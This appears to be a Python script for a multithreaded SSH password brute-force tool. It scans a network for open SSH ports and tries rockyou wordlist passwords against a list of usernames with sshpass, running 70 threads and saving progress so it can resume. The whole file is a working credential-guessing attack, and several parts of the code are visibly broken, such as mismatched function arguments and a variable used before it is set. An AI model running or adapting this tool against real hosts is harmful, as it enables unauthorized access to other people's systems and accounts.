import os
import time
import threading

'''
-------------------------------------------------------MYIMPORTS-------------------------------------------------------
'''

import SSHScanNetwork
import SSHFiles

myCurrentGlobalIp = SSHScanNetwork.getMyGlobalIp()

#To check if rockyou2.txt exist

splitBy = SSHFiles.detectOS()
getPathToCurrentDir = SSHFiles.getPathToCurrentDir()

#Running setup need nmap and keyboard
if SSHFiles.checkIfFileExist(getPathToCurrentDir + "rockyou2.txt"):
    os.system("chmod u+x getRockyou.sh")
    os.system("sh setup.sh")


amountOfLinesInRockyou = SSHFiles.getAmountOfLinesInFile(getPathToCurrentDir + "rockyou2.txt")
#print(linesInFile)

'''
-------------------------------------------------------INITIALIZER-------------------------------------------------------
'''
#List of all illegal chars in password
listOfIllegalChars = [
    ":",
    ";",
    "!",
    "#"
]

'''
-------------------------------------------------------MODE-------------------------------------------------------
'''

mode2 = "ssh"
mode = "sshpass -p"
toAttack = "potet"
server = "192.168.1.131"

#Input the amount of threads
amountOfThreads = 70

'''
-------------------------------------------------------FILES TO READ-------------------------------------------------------
'''

passwordFile = "rockyou2.txt"
usernameFile = "usernames.txt"
threadattackChildToIpFolder = "Threadattack"
IPFolderName = "IPs"

#Reading passwords
passwords = usernames = SSHFiles.readTXTFile(getPathToCurrentDir + "rockyou2.txt")

#Reading usernames
usernames = SSHFiles.readTXTFile(getPathToCurrentDir + "usernames.txt")

ipAddresses = SSHScanNetwork.getListWithIpsOfOpenSSHPorts()

'''
-------------------------------------------------------PROGRAMS-------------------------------------------------------
'''

def threadAttack(thread_id):
    print("Starting a session with thread_id: " + str(thread_id))
    listWithStartStopIndex = getStartAndStopIndex(thread_id)
    saveProgressNumber = round((listWithStartStopIndex[1] - listWithStartStopIndex[0]) / 100)
    counter = 0
    isError = False

    #howManyPasswordsForEachThread = round(amountOfLinesInRockyou / amountOfThreads)
    #startIndex = howManyPasswordsForEachThread * thread_id
    print(getPathToCurrentDir + IPFolderName + splitBy + threadattackChildToIpFolder)
    if SSHFiles.checkIfFileExist(getPathToCurrentDir + IPFolderName + splitBy + threadattackChildToIpFolder):
        #If folder does not exist create a new folder using parentToIpFolder as name
        print("File did not exist")
        SSHFiles.makeDirectory(getPathToCurrentDir + IPFolderName + splitBy + threadattackChildToIpFolder)

    print(getPathToCurrentDir + IPFolderName + splitBy + threadattackChildToIpFolder + splitBy + myCurrentGlobalIp)
    if SSHFiles.checkIfFileExist(getPathToCurrentDir + IPFolderName + splitBy + threadattackChildToIpFolder + splitBy + myCurrentGlobalIp):
        #If folder does not exist create a new folder using myCurrentGlobalIp as name
        SSHFiles.makeDirectory(getPathToCurrentDir + IPFolderName + splitBy + threadattackChildToIpFolder + splitBy + myCurrentGlobalIp)

    for ip in ipAddresses:
        if isError:
            break
        #print(ip)
        SSHFiles.createTXTFileInSpecifiedDir(getPathToCurrentDir + IPFolderName + splitBy + threadattackChildToIpFolder + splitBy + myCurrentGlobalIp + splitBy + ip + ".txt")
        for user in usernames:
            if isError:
                break
            removingBreakline = user.split("\n")
            user = removingBreakline[0]
            index = resumeFromWhere(ip + ".txt", thread_id, user)
            if index == -1:
                #Goes to next user
                continue
            elif index == 0:
                addStartingPoint(ip, thread_id, thread_id * (amountOfLinesInRockyou / amountOfThreads), (1 + thread_id) * (amountOfLinesInRockyou / amountOfThreads), user, 0)
            nextSaveAtIndex = saveProgressNumber
            printOnce = True
            for pw in passwords:
                try:

                    if isError:
                        break
                    counter += 1
                    #Skipping all previously tried passwords
                    if counter <= index:
                        if printOnce:
                            printOnce = False
                            print("Skipping all previously tried passwords...")
                        if nextSaveAtIndex == counter:
                            nextSaveAtIndex = nextSaveAtIndex + saveProgressNumber
                        continue
                    if amountOfLinesInRockyou == counter:
                        writeProgress(ip, user, "DONE")
                    if nextSaveAtIndex == counter:
                        #For every 143 lines it saves progress
                        writeProgress(ip, user, 1)
                        nextSaveAtIndex = nextSaveAtIndex + saveProgressNumber
                    password = passWordHandling(pw)
                    print("\nThread: " + str(thread_id) + " is attacking: " + ip + " with user: " + str(user) + " Trying with password: " + password + " Attempt: " + str(counter))
                    print("Next save is at index: " + str(nextSaveAtIndex))
                    #commandLiteral = mode + " " + password + " " + mode2 + " " + str(user) + "@" + ip
                    #print(commandLiteral)
                    command = mode + " " + password + " " + mode2 + " " + str(user) + "@" + ip
                    os.system(command)
                except KeyboardInterrupt:
                    print("etasd")
                    isError = True
                    break

def attackAllOnScannedNetworkBySequenceImproved():
    counter = 0
    isError = False
    for ip in ipAddresses:
        if isError:
            break

'''
-------------------------------------------------------HELPERS-------------------------------------------------------
'''

def filterIllegalChars(password):
    for char in password:
        for illegalChar in listOfIllegalChars:
            if illegalChar == char:
                #print("Replacing: " + char + " with " + illegalChar)
                password = password.replace(illegalChar, "")

    return password

def resumeFromWhere(ip, thread_id, username):
    filename = getPathToCurrentDir + IPFolderName + splitBy + threadattackChildToIpFolder + splitBy + myCurrentGlobalIp + splitBy + ip + ".txt"
    listStartAndStopIndex = getStartAndStopIndex(thread_id)

    startIndex = listStartAndStopIndex[0]
    stopIndex = listStartAndStopIndex[1]

    index = startIndex

    print(startIndex, stopIndex)
    if SSHFiles.checkIfFileExist(filename):
        #Checks if current ip has a file named after itsself if it has returns true
        contentOfFile = SSHFiles.readTXTFile(filename)
        for i in range(SSHFiles.getAmountOfLinesInFile(filename)):
            #For every line in file
            splitList = contentOfFile[i].split(" ")
            print(splitList)
            try:
                if thread_id == splitList[0] and username == splitList[3] and splitList[4]  == "DONE":
                    print("Done testing passwords for this user. Proceeding to next user...")
                    index = -1
                    break
                elif thread_id == int(splitList[0]) and username == splitList[1]:
                    #adding index based on previous reads
                    index = index + (((stopIndex - startIndex) / 1000) * pow(10, int(splitList[2])))
                #elif "-s" == splitList[0] and thread_id == splitList[1] and username == splitList[4]:
                    #print("heisann")
                    #index = index + startIndex
            except:
                pass

    #Returns the index where it should start to read for new passwords for the user
    #If file does not exist then it has not attempted to log in on that ip yet
    #Starts from index 0
    index = round(index)
    print("Resuming from index " + str(index))
    return index

def writeProgress(ip, thread_id, username, value):
    #Default value is 1
    #See info.txt in IPs
    print("Adding progress to file...")
    SSHFiles.addTextToSpecifiedFile(getPathToCurrentDir + IPFolderName + splitBy + myCurrentGlobalIp + splitBy + ip + ".txt", thread_id + " " + username + " " + str(value) + " \n")

def addStartingPoint(ip, thread_id, startIndex, stopIndex, username, value):
    #Default value is 0
    #See info.txt in IPs
    path = getPathToCurrentDir + IPFolderName + splitBy + myCurrentGlobalIp + splitBy + ip + ".txt"
    toAddToTextFile = "-s" + " " + str(thread_id) + " " + str(startIndex) + " " + str(stopIndex) + " " + username + " " + str(value) + " \n"
    print("Adding starting point to file...")
    SSHFiles.addTextToSpecifiedFile(path, toAddToTextFile)

def checkIfIpIsUnderAttack(ip):
    baseSecondsToCheck = 7.5
    ipToCheck = getPathToCurrentDir + IPFolderName + splitBy + myCurrentGlobalIp + splitBy + ip + ".txt"
    #Checks if file has been updated in the last 7.5 seconds
    amountOfLinesInThePast = SSHFiles.getAmountOfLinesInFile(ipToCheck)
    future = time.process_time() + baseSecondsToCheck
    while now < future:
        now = time.process_time()
        getLinesNow = SSHFiles.getAmountOfLinesInFile(ipToCheck)

    if amountOfLinesInThePast != getLinesNow:
        #If lines are different the ip is under attack
        return True
    return False

def startThreads(amountOfThreads):
    threads = []

    for i in range(amountOfThreads):
        t = threading.Thread(target=threadAttack, args=(i,))
        t.daemon = True
        threads.append(t)

    for i in range(amountOfThreads):
        threads[i].start()

    for i in range(amountOfThreads):
        threads[i].join()

def passWordHandling(pw):
    password = str(pw)
    for illegalChar in listOfIllegalChars:
        if illegalChar in password:
            password = filterIllegalChars(password)
    passwordList = password.split("\n")
    password = passwordList[0]
    return password

def getStartAndStopIndex(thread_id):
    startIndex = round(thread_id * (amountOfLinesInRockyou / amountOfThreads))
    stopIndex = round((1 + thread_id) * (amountOfLinesInRockyou / amountOfThreads))

    return startIndex, stopIndex
'''
-------------------------------------------------------MAIN-------------------------------------------------------
'''
#Main
startThreads(amountOfThreads)

#resumeFromWhere("192.168.1.20", 0, "isak")
#print(filterIllegalChars("asd:awe;"))
#targetAttack()
#threadAttack()
#writeProgress("192.168.1.20", "test")
#print(resumeFromWhere("192.168.1.20.txt", "isak"))